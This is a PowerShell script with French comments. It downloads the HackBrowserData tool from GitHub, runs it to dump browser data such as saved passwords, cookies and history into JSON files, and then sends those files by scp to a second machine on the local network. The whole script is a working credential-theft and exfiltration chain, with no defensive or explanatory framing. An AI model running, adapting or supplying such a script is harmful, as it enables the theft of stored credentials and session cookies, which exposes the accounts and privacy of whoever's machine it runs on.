# Variables
$serverUser = "123"
$serverIP = "192.168.0.54"  # IP du premier PC
$destDir = "/home/$serverUser/hackbrowserdata"
$localPath = "$env:USERPROFILE\hackbrowserdata"
$zipPath = "$localPath\hackbrowserdata.zip"
$exePath = "$localPath\hack-browser-data.exe"

# Créer un dossier temporaire
Write-Output "[+] Création du dossier de travail..."
New-Item -ItemType Directory -Path $localPath -Force | Out-Null

# Vérifier la connexion SSH avant de continuer
Write-Output "[+] Test de connexion SSH..."
$sshTest = Test-NetConnection -ComputerName $serverIP -Port 22
if (-not $sshTest.TcpTestSucceeded) {
    Write-Output "[!] Erreur : Impossible de contacter $serverIP via SSH. Vérifie ton réseau et SSH."
    exit 1
}

# Télécharger HackBrowserData
Write-Output "[+] Téléchargement de HackBrowserData..."
$downloadUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"

Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath

# Vérifier si le fichier a été téléchargé correctement
if (-not (Test-Path $zipPath)) {
    Write-Output "[!] Erreur : Échec du téléchargement de HackBrowserData."
    exit 1
}

# Extraire l’archive
Write-Output "[+] Extraction..."
Expand-Archive -Path $zipPath -DestinationPath $localPath -Force

# Vérifier si l'exécutable est présent après extraction
if (-not (Test-Path $exePath)) {
    Write-Output "[!] Erreur : Fichier hack-browser-data.exe introuvable après extraction."
    exit 1
}

# Exécuter HackBrowserData
Write-Output "[+] Extraction des données..."
Set-Location $localPath
Start-Process -NoNewWindow -FilePath $exePath -ArgumentList "-o json" -Wait

# Vérifier si des fichiers JSON ont été créés
$jsonFiles = Get-ChildItem -Path $localPath -Filter "*.json"
if ($jsonFiles.Count -eq 0) {
    Write-Output "[!] Erreur : Aucun fichier JSON trouvé. HackBrowserData a peut-être échoué."
    exit 1
}

# Vérifier que WinSCP est installé avant d'envoyer les fichiers
if (-not (Get-Command "scp.exe" -ErrorAction SilentlyContinue)) {
    Write-Output "[!] Erreur : SCP (WinSCP) introuvable. Installe WinSCP et ajoute-le au PATH."
    exit 1
}

# Transférer les fichiers via SCP
Write-Output "[+] Envoi des fichiers..."
scp "$localPath\*.json" "$serverUser@$serverIP:`$destDir"

# Vérification de l'envoi
if ($?) {
    Write-Output "[+] Terminé ! Les fichiers sont sur $serverIP:$destDir"
} else {
    Write-Output "[!] Erreur : Échec du transfert des fichiers via SCP."
    exit 1
}
